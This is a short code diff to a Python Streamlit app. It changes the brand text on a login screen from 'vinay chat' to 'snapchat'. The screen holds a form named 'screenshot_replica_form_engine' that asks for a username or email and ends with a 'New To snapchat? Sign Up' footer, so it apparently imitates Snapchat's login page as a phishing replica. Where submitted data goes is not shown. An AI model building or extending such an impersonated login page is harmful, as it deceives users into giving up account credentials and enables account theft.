@@ -430,7 +430,7 @@ elif st.session_state.step == 5:
         st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
     st.markdown("</div>", unsafe_allow_html=True)
             
-    st.markdown("<p class='replica-brand-text'>vinay chat</p>", unsafe_allow_html=True)
+    st.markdown("<p class='replica-brand-text'>snapchat</p>", unsafe_allow_html=True)
     
     with st.form("screenshot_replica_form_engine", clear_on_submit=False):
         st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
@@ -474,7 +474,7 @@ elif st.session_state.step == 5:
                 st.warning("All parameters required.")
                 
     st.markdown("</div>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To vinay chat?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To snapchat ?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
     st.markdown("</div>", unsafe_allow_html=True)
 
 
